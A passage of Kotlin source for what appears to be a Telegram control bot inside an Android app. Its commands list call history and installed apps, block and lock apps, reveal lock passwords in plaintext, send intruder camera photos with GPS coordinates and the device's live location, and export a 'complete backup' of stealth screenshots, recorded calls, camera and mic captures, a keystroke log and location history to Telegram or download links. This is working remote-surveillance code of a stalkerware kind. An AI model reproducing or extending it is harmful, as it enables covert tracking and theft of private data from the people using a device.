        return "(no name)"
    }

    /** Render call log entries that match any of this contact's phone numbers. */
    private suspend fun renderContactCallsPage(rawId: String, offset: Int, editMessageId: Long?) {
        try {
            val c = ContactMediaStoreHelper.getByIdAsync(MainApp.instance, rawId)
            if (c == null) {
                val msg = "❌ Contact not found."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val display = contactDisplayName(c)
            val phones = c.phoneNumbers.map { it.value.filter { ch -> ch.isDigit() } }.filter { it.isNotEmpty() }
            if (phones.isEmpty()) {
                val msg = "📞 <b>${htmlEsc(display)}</b> has no phone numbers — no call history available."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val pageSize = 15
            // Fetch call logs for each phone number and merge results client-side
            val allCalls = mutableListOf<DCall>()
            for (phone in phones) {
                val results = try { CallMediaStoreHelper.searchAsync(MainApp.instance, phone, 200, 0) } catch (_: Exception) { emptyList() }
                allCalls.addAll(results)
            }
            // De-duplicate by ID and sort newest first
            val deduped = allCalls.distinctBy { it.id }.sortedByDescending { it.startedAt.toEpochMilliseconds() }
            val window = deduped.drop(offset).take(pageSize + 1)
            val hasMore = window.size > pageSize
            val pageItems = window.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📞 No call history found for <b>${htmlEsc(display)}</b>." else "📞 No more entries."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("📋 <b>Call History — ${htmlEsc(display)}</b>\n")
            sb.append("Showing ${offset + 1}–${offset + pageItems.size}\n\n")
            pageItems.forEachIndexed { i, call ->
                val typeEmoji = when (call.type) {
                    CallLog.Calls.INCOMING_TYPE -> "📲 Incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "📤 Outgoing"
                    CallLog.Calls.MISSED_TYPE -> "❌ Missed"
                    CallLog.Calls.REJECTED_TYPE -> "🚫 Rejected"
                    else -> "📞"
                }
                val dur = if (call.duration > 0) "  ⏱ ${call.duration}s" else ""
                // Resolve the name for this specific number (contact may have multiple numbers)
                val resolvedName = call.name.ifBlank { lookupContactName(call.number) }
                sb.append("${offset + i + 1}. $typeEmoji$dur\n")
                if (resolvedName.isNotBlank()) {
                    sb.append("   👤 <b>${htmlEsc(resolvedName)}</b>\n")
                }
                sb.append("   📱 <code>${htmlEsc(call.number)}</code>\n")
                sb.append("   🕐 ${fmtTime(call.startedAt.toEpochMilliseconds())}\n\n")
            }
            val rows = mutableListOf<List<Pair<String, String>>>()
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "c_calls_pg:$rawId:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "c_calls_pg:$rawId:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("⬅️ Back to contact" to "c_view:$rawId:_:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not load call history: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    /** Free-form text query the user is currently scrolling. Empty = all apps. */
    @Volatile private var lastAppsQuery: String = ""

    private suspend fun cmdApps(args: List<String>) {
        sendTyping()
        lastAppsQuery = args.joinToString(" ").trim()
        renderAppsPickerPage(lastAppsQuery, offset = 0, editMessageId = null)
    }

    /**
     * Modern paginated app picker. Each row is a tappable inline button that opens
     * the per-app action menu (renderAppDetail). The header summarizes the page,
     * and footer rows give Prev / Next / 🔍 Search controls.
     */
    private suspend fun renderAppsPickerPage(query: String, offset: Int, editMessageId: Long?) {
        sendTyping()
        try {
            val pageSize = 10
            val q = if (query.isBlank()) "" else "text:$query"
            val apps = PackageHelper.searchAsync(
                q, pageSize + 1, offset,
                com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC,
            )
            val hasMore = apps.size > pageSize
            val pageItems = apps.take(pageSize)
            val limits = AppBlockHelper.getTimeLimits()
            val title = StringBuilder("📱 <b>Installed Apps</b>")
            if (query.isNotBlank()) title.append(" — search: <code>${htmlEsc(query)}</code>")
            title.append("\n")
            if (pageItems.isEmpty()) {
                val msg = "$title\n\nNo apps found.\nTry <code>/apps</code> to clear the search."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            title.append("Showing ${offset + 1}–${offset + pageItems.size}  ·  tap any app for actions\n\n")
            val sb = StringBuilder(title)
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, a ->
                val blocked = AppBlockHelper.isBlocked(a.id)
                val limited = limits.containsKey(a.id)
                val tag = when {
                    blocked -> " 🚫"
                    limited -> " ⏱"
                    else -> ""
                }
                sb.append("${offset + i + 1}. <b>${htmlEsc(a.name)}</b>$tag\n")
                sb.append("   <code>${htmlEsc(a.id)}</code>  ·  v${htmlEsc(a.version)}\n\n")
                rows.add(listOf("${offset + i + 1}. ${a.name.take(28)}$tag" to "appd:${pkgToken(a.id)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "apps_pg:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "apps_pg:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("🔍 Search apps" to "apps_q", "🔄 Refresh" to "apps_pg:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not list apps: ${htmlEsc(e.message ?: "")}")
        }
    }

    /**
     * Per-app action panel. Shows everything you'd want to do with the app —
     * launch it, open its system Settings page, block it instantly, time-limit
     * it for the day, uninstall it, pull its APK & icon down to Telegram, copy
     * its package id to the device clipboard, and a Play Store link.
     */
    private suspend fun renderAppDetail(pkg: String, editMessageId: Long?) {
        try {
            val info = try {
                PackageHelper.searchAsync(
                    "ids:$pkg", 1, 0,
                    com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC,
                ).firstOrNull()
            } catch (_: Exception) { null }
            if (info == null) {
                val msg = "❌ App not found or no longer installed: <code>${htmlEsc(pkg)}</code>"
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val isSystem = (info.appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
            val canLaunch = PackageHelper.canLaunch(pkg)
            val isBlocked = AppBlockHelper.isBlocked(pkg)
            val limitMs = AppBlockHelper.getTimeLimits()[pkg]
            val installed = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
                .format(java.util.Date(info.installedAt.toEpochMilliseconds()))
            val updated = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
                .format(java.util.Date(info.updatedAt.toEpochMilliseconds()))
            val apkSize = humanSize(info.size)
            val text = buildString {
                append("📱 <b>${htmlEsc(info.name)}</b>\n")
                append("<code>${htmlEsc(info.id)}</code>\n\n")
                append("🏷 <b>Version:</b> ${htmlEsc(info.version)}\n")
                append("📦 <b>APK size:</b> $apkSize\n")
                append("📅 <b>Installed:</b> $installed\n")
                append("🔄 <b>Updated:</b> $updated\n")
                append("🛠 <b>Type:</b> ${if (isSystem) "System app" else "User app"}\n")
                append("🚀 <b>Launchable:</b> ${if (canLaunch) "yes" else "no (background only)"}\n")
                when {
                    isBlocked -> append("🚫 <b>Status:</b> Blocked\n")
                    limitMs != null -> append("⏱ <b>Status:</b> Limited to ${limitMs / 60_000} min/day\n")
                    else -> append("✅ <b>Status:</b> Active\n")
                }
            }
            val tok = pkgToken(pkg)
            val rows = mutableListOf<List<Pair<String, String>>>()
            // Row 1 — primary actions: launch + settings page
            val row1 = mutableListOf<Pair<String, String>>()
            if (canLaunch) row1.add("▶️ Launch" to "appl:$tok")
            row1.add("⚙️ Settings page" to "appst:$tok")
            rows.add(row1)
            // Row 2 — block / unblock
            if (isBlocked) {
                rows.add(listOf("✅ Unblock" to "appunblock:$tok"))
            } else {
                rows.add(listOf("🚫 Block always" to "appblock:$tok"))
            }
            // Row 3 — time-limit shortcuts (or clear if a limit is set)
            if (limitMs != null) {
                rows.add(listOf("✕ Clear ${limitMs / 60_000} min limit" to "appclim:$tok"))
            } else {
                rows.add(listOf(
                    "⏱ 30 min" to "applimit:$tok:30",
                    "⏱ 1 h" to "applimit:$tok:60",
                    "⏱ 2 h" to "applimit:$tok:120",
                ))
            }
            // Row 4 — file ops: APK + icon download
            rows.add(listOf(
                "📥 Download APK" to "appapk:$tok",
                "🖼 Send icon" to "appicn:$tok",
            ))
            // Row 5 — utilities: clipboard + play store url + uninstall
            rows.add(listOf(
                "📋 Copy package id" to "appcp:$tok",
                "🛒 Play Store" to "url:https://play.google.com/store/apps/details?id=$pkg",
            ))
            // Row 6 — danger zone (system apps can't be uninstalled normally)
            if (!isSystem) {
                rows.add(listOf("🗑 Uninstall" to "appu:$tok"))
            }
            // Row 7 — back to list
            rows.add(listOf("◀️ Back to apps" to "apps_pg:0"))

            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
            else sendMessage(text, replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not open app details: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdBlockApp(args: List<String>) {
        if (args.isNotEmpty()) {
            val pkg = args[0]
            AppBlockHelper.setBlocked(pkg, true)
            sendMessage("🚫 <b>${htmlEsc(pkg)}</b> is now blocked.\n\nUse /unblockapp $pkg to unblock.")
            return
        }
        renderAppPickerForBlock(query = "", offset = 0, editMessageId = null)
    }

    private suspend fun cmdUnblockApp(args: List<String>) {
        if (args.isNotEmpty()) {
            val pkg = args[0]
            AppBlockHelper.setBlocked(pkg, false)
            sendMessage("✅ <b>${htmlEsc(pkg)}</b> is now unblocked.")
            return
        }
        renderUnblockPicker(editMessageId = null)
    }

    private fun cmdBlockedApps() {
        scope.launch { renderUnblockPicker(editMessageId = null) }
    }

    // ─────────────────────────── Per-App Locker ───────────────────────────

    private fun cmdAppLocker(args: List<String>) {
        scope.launch {
            if (args.isNotEmpty()) renderAppLockerPicker(args.joinToString(" "), 0, editMessageId = null)
            else renderAppLockerHome(editMessageId = null)
        }
    }

    private suspend fun renderAppLockerHome(editMessageId: Long?) {
        sendTyping()
        try {
            val locks = PerAppLockHelper.getAllLocks()
            val sb = buildString {
                append("🔐 <b>Per-App Locker</b>\n")
                append("Protect individual apps with a password.\n\n")
                if (locks.isEmpty()) {
                    append("<i>No apps locked yet. Tap ➕ Lock an App to get started.</i>")
                } else {
                    append("<b>${locks.size} locked app${if (locks.size != 1) "s" else ""}:</b>\n\n")
                    locks.forEach { lock ->
                        val name = try { PackageHelper.getLabel(lock.packageName).ifEmpty { lock.packageName } } catch (_: Throwable) { lock.packageName }
                        val typeLabel = lock.lockType.uppercase()
                        val secs = PerAppLockHelper.getSessionSecondsRemaining(lock.packageName)
                        val sessionTag = if (secs > 0) " · ⏱ unlocked ${secs / 60}m${secs % 60}s" else ""
                        append("  • <b>${htmlEsc(name)}</b> [$typeLabel]$sessionTag\n")
                        append("    <code>${htmlEsc(lock.packageName)}</code>\n")
                    }
                }
            }
            val rows = mutableListOf<List<Pair<String, String>>>()
            locks.take(8).forEach { lock ->
                val name = try { PackageHelper.getLabel(lock.packageName).ifEmpty { lock.packageName } } catch (_: Throwable) { lock.packageName }
                rows.add(listOf("🔒 ${name.take(32)}" to "alk_sel:${pkgToken(lock.packageName)}"))
            }
            rows.add(listOf("➕ Lock an App" to "alk_q", "🔍 Browse All" to "alk_pg:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb, replyMarkup = markup)
            else sendMessage(sb, replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not load app locker: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun renderAppLockerPicker(query: String, offset: Int, editMessageId: Long?) {
        sendTyping()
        try {
            val pageSize = 10
            val q = if (query.isBlank()) "" else "text:$query"
            val apps = PackageHelper.searchAsync(q, pageSize + 1, offset, FileSortBy.NAME_ASC)
            val hasMore = apps.size > pageSize
            val pageItems = apps.take(pageSize)
            val sb = buildString {
                append("📱 <b>Select an App to Lock</b>")
                if (query.isNotBlank()) append(" — <code>${htmlEsc(query)}</code>")
                append("\n")
                if (pageItems.isEmpty()) {
                    append("\n<i>No apps found.</i>")
                } else {
                    append("Showing ${offset + 1}–${offset + pageItems.size} · tap to open lock menu\n\n")
                    pageItems.forEachIndexed { i, a ->
                        val lockTag = if (PerAppLockHelper.getLock(a.id) != null) " 🔒" else ""
                        append("${offset + i + 1}. <b>${htmlEsc(a.name)}</b>$lockTag\n   <code>${htmlEsc(a.id)}</code>\n\n")
                    }
                }
            }
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, a ->
                val lockTag = if (PerAppLockHelper.getLock(a.id) != null) " 🔒" else ""
                rows.add(listOf("${offset + i + 1}. ${a.name.take(30)}$lockTag" to "alk_sel:${pkgToken(a.id)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "alk_pg:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "alk_pg:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("🔍 Search" to "alk_q", "🏠 Locker Home" to "alk_home"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb, replyMarkup = markup)
            else sendMessage(sb, replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not load apps: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun renderAppLockMenu(pkg: String, editMessageId: Long?) {
        try {
            val info = try { PackageHelper.searchAsync("ids:$pkg", 1, 0, FileSortBy.NAME_ASC).firstOrNull() } catch (_: Exception) { null }
            val name = info?.name ?: pkg
            val lock = PerAppLockHelper.getLock(pkg)
            val secs = PerAppLockHelper.getSessionSecondsRemaining(pkg)
            val sessionText = if (secs > 0) "⏱ Unlocked — ${secs / 60}m ${secs % 60}s left" else "🔒 Locked"
            val cred = lock?.let { PerAppLockHelper.decodeCredential(it.encodedCredential) }
            val failCount = PerAppLockHelper.getAttempts(pkg).count { !it.success }
            val text = buildString {
                append("🔐 <b>${htmlEsc(name)}</b>\n")
                append("<code>${htmlEsc(pkg)}</code>\n\n")
                if (lock != null) {
                    append("🔒 <b>Lock type:</b> ${lock.lockType.uppercase()}\n")
                    append("🔑 <b>Password:</b> <tg-spoiler>${htmlEsc(cred ?: "")}</tg-spoiler>\n")
                    append("📊 <b>Status:</b> $sessionText\n")
                    append("❌ <b>Failed attempts:</b> $failCount total\n")
                } else {
                    append("✅ <b>Status:</b> Not locked — no password set\n")
                }
            }
            val tok = pkgToken(pkg)
            val rows = mutableListOf<List<Pair<String, String>>>()
            if (lock != null) {
                rows.add(listOf("🔑 Change Password" to "alk_pin:$tok", "👁 Reveal Password" to "alk_view:$tok"))
                rows.add(listOf("🔓 Unlock 10 min" to "alk_unlock:$tok", "⏱ Session Status" to "alk_status:$tok"))
                rows.add(listOf("📋 Attempt Log" to "alk_attempts:$tok", "🗑 Remove Lock" to "alk_rm:$tok"))
            } else {
                rows.add(listOf("🔐 Set Password" to "alk_pin:$tok"))
            }
            rows.add(listOf("◀️ Back to App Locker" to "alk_home"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
            else sendMessage(text, replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not load lock menu: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdIntruderCaptures(args: List<String>) {
        sendTyping()
        try {
            val limit = (args.getOrNull(0)?.toIntOrNull() ?: 5).coerceIn(1, 20)
            val captures = IntruderCaptureHelper.list().take(limit)
            val total = IntruderCaptureHelper.count()
            if (captures.isEmpty()) {
                sendMessage("📷 <b>Intruder Captures</b>\n\n<i>No captures yet. A front-camera photo is taken automatically on every wrong password or PIN attempt.</i>")
                return
            }
            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            sendMessage("📷 <b>Intruder Captures</b> — last $limit of $total total\n<i>Use /intruders 20 to fetch more.</i>")
            captures.forEach { c ->
                val triggerLabel = when (c.trigger) {
                    IntruderCaptureHelper.Trigger.PER_APP_LOCK -> "🔐 Per-App Lock"
                    IntruderCaptureHelper.Trigger.APP_PIN -> "📌 App PIN"
                    IntruderCaptureHelper.Trigger.SECURITY_QA -> "🔒 Security Q&A"
                    IntruderCaptureHelper.Trigger.TELEGRAM_BOT -> "🤖 Telegram Bot"
                    else -> c.trigger
                }
                val caption = buildString {
                    append("🎯 $triggerLabel\n")
                    if (c.triggerDetail.isNotBlank()) append("📋 ${htmlEsc(c.triggerDetail)}\n")
                    append("🕐 ${sdf.format(java.util.Date(c.timestamp))}\n")
                    if (c.hasLocation) append("📍 <a href=\"https://maps.google.com/?q=${c.lat},${c.lng}\">${"%.5f".format(c.lat)}, ${"%.5f".format(c.lng)}</a>")
                    else append("📍 No location")
                }
                val photo = if (c.absPath.isNotEmpty()) { val f = java.io.File(c.absPath); if (f.exists()) f else null } else null
                if (photo != null) TelegramApiClient.sendPhoto(token, chatId, photo, caption)
                else sendMessage(caption)
            }
        } catch (e: Exception) {
            sendMessage("❌ Could not load captures: ${htmlEsc(e.message ?: "")}")
        }
    }

    /** Show installed apps with inline buttons; tapping opens the per-app block menu. */
    private suspend fun renderAppPickerForBlock(query: String, offset: Int, editMessageId: Long?) {
        sendTyping()
        try {
            val pageSize = 12
            val apps = PackageHelper.searchAsync(
                if (query.isEmpty()) "" else "text:$query",
                pageSize + 1, offset,
                com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC
            )
            val hasMore = apps.size > pageSize
            val pageItems = apps.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = "📱 No apps found."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val title = "🚫 <b>Block an app</b>\n<i>Tap an app to choose a block option.</i>\n" +
                "Showing ${offset + 1}–${offset + pageItems.size}\n\n"
            val sb = StringBuilder(title)
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, a ->
                val blockedTag = if (AppBlockHelper.isBlocked(a.id)) " 🚫" else ""
                sb.append("${offset + i + 1}. <b>${htmlEsc(a.name)}</b>$blockedTag\n   <code>${htmlEsc(a.id)}</code>\n")
                rows.add(listOf("${a.name.take(28)}$blockedTag" to "block_pick:${a.id.take(50)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "block_list:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "block_list:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("🔍 Search apps" to "blockapp_q", "🔄 Refresh" to "block_list:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not list apps: ${htmlEsc(e.message ?: "")}")
        }
    }

    /** After tapping an app, show the block-action menu (instant or timed). */
    private suspend fun renderBlockActionMenu(pkg: String, editMessageId: Long) {
        val name = try {
            PackageHelper.searchAsync("ids:$pkg", 1, 0, com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC).firstOrNull()?.name ?: pkg
        } catch (_: Exception) { pkg }
        val text = buildString {
            append("📱 <b>${htmlEsc(name)}</b>\n<code>${htmlEsc(pkg)}</code>\n\n")
            append("Choose a block option:")
        }
        val rows = listOf(
            listOf("🚫 Block now (always)" to "block_now:${pkg.take(50)}"),
            listOf(
                "⏱ 30 min today" to "block_lim:${pkg.take(45)}:30",
                "⏱ 1 h today" to "block_lim:${pkg.take(45)}:60",
            ),
            listOf(
                "⏱ 2 h today" to "block_lim:${pkg.take(45)}:120",
                "⏱ 4 h today" to "block_lim:${pkg.take(45)}:240",
            ),
            listOf("◀️ Back" to "block_list:0"),
        )
        TelegramApiClient.editMessageText(
            token, chatId, editMessageId, text,
            replyMarkup = TelegramApiClient.inlineKeyboard(rows)
        )
    }

    /** Show currently blocked apps as inline keyboard; tapping unblocks. */
    private suspend fun renderUnblockPicker(editMessageId: Long?) {
        val blocked = AppBlockHelper.getBlockedSet().toList()
        val limits = AppBlockHelper.getTimeLimits()
        if (blocked.isEmpty() && limits.isEmpty()) {
            val msg = "✅ No apps are currently blocked or limited."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
            return
        }
        // Resolve nice names
        val ids = (blocked + limits.keys).distinct()
        val nameMap = try {
            PackageHelper.searchAsync("ids:${ids.joinToString(",")}", ids.size, 0, com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC)
                .associate { it.id to it.name }
        } catch (_: Exception) { emptyMap() }

        val sb = StringBuilder("📵 <b>Blocked & limited apps</b>\n<i>Tap to unblock / clear limit.</i>\n\n")
        val rows = mutableListOf<List<Pair<String, String>>>()
        blocked.forEachIndexed { i, pkg ->
            val nm = nameMap[pkg] ?: pkg
            sb.append("${i + 1}. 🚫 <b>${htmlEsc(nm)}</b>\n   <code>${htmlEsc(pkg)}</code>\n\n")
            rows.add(listOf("✅ Unblock ${nm.take(28)}" to "unblock:${pkg.take(55)}"))
        }
        limits.entries.forEachIndexed { i, (pkg, dailyMs) ->
            val nm = nameMap[pkg] ?: pkg
            val mins = dailyMs / 60000
            sb.append("${blocked.size + i + 1}. ⏱ <b>${htmlEsc(nm)}</b> · ${mins} min/day\n   <code>${htmlEsc(pkg)}</code>\n\n")
            rows.add(listOf("✕ Clear limit ${nm.take(24)}" to "limit_clr:${pkg.take(50)}"))
        }
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    @SuppressLint("MissingPermission")
    private fun cmdLocation() {
        sendMessage("📍 Getting location…")
        try {
            val lm = MainApp.instance.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val providers = listOf(
                android.location.LocationManager.GPS_PROVIDER,
                android.location.LocationManager.NETWORK_PROVIDER
            )
            var loc: android.location.Location? = null
            for (p in providers) {
                if (lm.isProviderEnabled(p)) {
                    loc = lm.getLastKnownLocation(p)
                    if (loc != null) break
                }
            }
            if (loc == null) {
                sendMessage("❌ Location not available. Ensure Location permission & GPS are enabled.")
                return
            }
            val age = (System.currentTimeMillis() - loc.time) / 1000
            TelegramApiClient.sendLocation(token, chatId, loc.latitude, loc.longitude)
            sendMessage("📍 <b>Location</b>\n" +
                "🌐 Lat: <code>${loc.latitude}</code>\n" +
                "🌐 Lon: <code>${loc.longitude}</code>\n" +
                "🎯 Accuracy: ±${loc.accuracy.toInt()}m\n" +
                "🕐 Age: ${age}s ago")
        } catch (e: Exception) {
            sendMessage("❌ Location error: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdBattery() {
        val bat = BatteryHistoryHelper.sampleNow(MainApp.instance)
        if (bat == null) { sendMessage("❌ Battery info unavailable."); return }
        val plugState = when (bat.plugged) {
            1 -> "⚡ AC charging"
            2 -> "⚡ USB charging"
            4 -> "⚡ Wireless charging"
            else -> "🔌 Unplugged"
        }
        val statusLabel = when (bat.status) {
            android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "Charging"
            android.os.BatteryManager.BATTERY_STATUS_DISCHARGING -> "Discharging"
            android.os.BatteryManager.BATTERY_STATUS_FULL -> "Full"
            android.os.BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "Not charging"
            else -> "Unknown"
        }
        val level = bat.level
        val bar = buildString {
            val filled = (level / 10)
            append("[")
            repeat(filled) { append("█") }
            repeat(10 - filled) { append("░") }
            append("]")
        }
        sendMessage("🔋 <b>Battery Status</b>\n\n" +
            "$bar <b>$level%</b>\n" +
            "🔌 $plugState\n" +
            "📊 Status: $statusLabel\n" +
            "🌡 Temp: ${bat.temperatureC}°C\n" +
            "⚡ Voltage: ${bat.voltageMv}mV\n" +
            "🕐 Checked: ${ts}")
    }

    private suspend fun cmdBackup() {
        val ctx = com.ismartcoding.plain.MainApp.instance
        sendMessage("⏳ <b>Building complete backup…</b>\n\nCollecting database, screenshots, calls, keystrokes, location, notes, settings…\nThis may take a few seconds.")

        val tmpFile = try {
            BackupManager.buildToTemp(ctx)
        } catch (e: Exception) {
            sendMessage("❌ Backup failed: ${htmlEsc(e.message ?: "unknown error")}")
            return
        }

        val fileName = BackupManager.buildFileName()
        val sizeMb   = tmpFile.length() / 1_048_576.0
        val sizeStr  = if (sizeMb < 0.1) "${tmpFile.length() / 1024} KB" else "${"%.1f".format(sizeMb)} MB"

        val contents = "🗄 <b>Database:</b> notes, bookmarks, feeds, books, chats, tags, sessions\n" +
                       "📸 <b>Stealth screenshots</b>\n" +
                       "📞 <b>Recorded calls</b>\n" +
                       "🎙 <b>Live captures</b> (camera/mic recordings, photos)\n" +
                       "👁 <b>Intruder captures</b>\n" +
                       "⌨️ <b>Keystroke log</b>\n" +
                       "🗺 <b>Location history</b>\n" +
                       "🌐 <b>Geofencing data + events</b>\n" +
                       "⚙️ <b>All settings &amp; preferences</b>\n" +
                       "🔐 <b>SSL certificate</b>\n" +
                       "🖼 <b>Note images, feed images, favicons</b>"

        val TELEGRAM_LIMIT = 50L * 1024 * 1024

        if (tmpFile.length() <= TELEGRAM_LIMIT) {
            val caption = "📦 <b>PlainApp Complete Backup</b>\n" +
                          "━━━━━━━━━━━━━━━━━━━\n" +
                          "📁 <code>$fileName</code>\n" +
                          "📏 Size: <b>$sizeStr</b>\n\n" +
                          "<b>Includes:</b>\n$contents\n\n" +
                          "💡 The <code>.plain</code> file is a ZIP — rename to <code>.zip</code> on your PC to browse raw files."
            val ok = TelegramApiClient.sendDocument(token, chatId, tmpFile, caption, displayName = fileName)
            if (!ok) {
                sendMessage("❌ Send failed (size: $sizeStr). Try /backup again.")
                return
            }
            val rows = listOf(listOf("📦 Also send as .zip" to "bk_zip", "🔄 Fresh backup" to "bk_rebuild"))
            sendMessage("✅ Backup sent above as <code>.plain</code> file.", replyMarkup = TelegramApiClient.inlineKeyboard(rows))
        } else {
            // > 50 MB — generate one-time download links served via Ktor
            val dlToken  = java.util.UUID.randomUUID().toString().replace("-", "").take(24)
            BackupDownloadManager.register(dlToken, tmpFile, fileName)

            val cfEnabled  = com.ismartcoding.plain.preferences.CloudflareTunnelEnabledPreference.getAsync(ctx)
            val cfHostname = com.ismartcoding.plain.preferences.CloudflareTunnelHostnamePreference.getAsync(ctx)
            val baseUrl    = if (cfEnabled && cfHostname.isNotBlank()) "https://$cfHostname"
                             else "http://${com.ismartcoding.lib.helpers.NetworkHelper.getDeviceIP4()}:${com.ismartcoding.plain.TempData.httpPort}"

            val sb = StringBuilder()
            sb.append("📦 <b>PlainApp Complete Backup</b>\n")
            sb.append("━━━━━━━━━━━━━━━━━━━\n")
            sb.append("📁 <code>$fileName</code>\n")
            sb.append("📏 <b>$sizeStr</b> — too large for Telegram (50 MB limit)\n")
            sb.append("⏰ Links valid for <b>30 minutes</b>\n\n")
            sb.append("🔗 <b>Download (.plain):</b>\n<code>$baseUrl/backup/dl?t=$dlToken</code>\n\n")
            sb.append("📦 <b>Download (.zip — same file, rename):</b>\n<code>$baseUrl/backup/dl?t=$dlToken&amp;zip=1</code>\n\n")
            sb.append("<b>Includes:</b>\n$contents\n\n")
            sb.append("💡 Open the <code>.zip</code> link on your PC to browse all raw files.")

            val rows = listOf(listOf("🔄 Fresh backup" to "bk_rebuild"))
            sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
        }
    }

    private fun cmdRestore() {
        pendingRestoreUntil = System.currentTimeMillis() + 5 * 60 * 1000L
        sendMessage(
            "📥 <b>Restore from Backup</b>\n" +
            "━━━━━━━━━━━━━━━━━━━\n\n" +
            "Send me a <code>.plain</code> or <code>.zip</code> backup file created by PlainApp.\n\n" +
            "⚠️ <b>Before you proceed:</b>\n" +
            "• All current app data will be <b>overwritten</b> with the backup's data\n" +
            "• The app will <b>restart automatically</b> after restore completes\n" +
            "• File must be a valid PlainApp backup (made by /backup or in-app export)\n\n" +
            "📏 <b>Size limit:</b> Telegram Bot API accepts files up to <b>20 MB</b>.\n" +
            "For larger backups, use the <b>Backup &amp; Restore</b> page inside the app.\n\n" +
            "⏰ Waiting for your file for <b>5 minutes</b>…\n" +
            "Send any /command to cancel."
        )
    }

    private suspend fun handleRestoreDocument(document: org.json.JSONObject) {
        val fileId   = document.optString("file_id", "")
        val fileName = document.optString("file_name", "restore.plain")
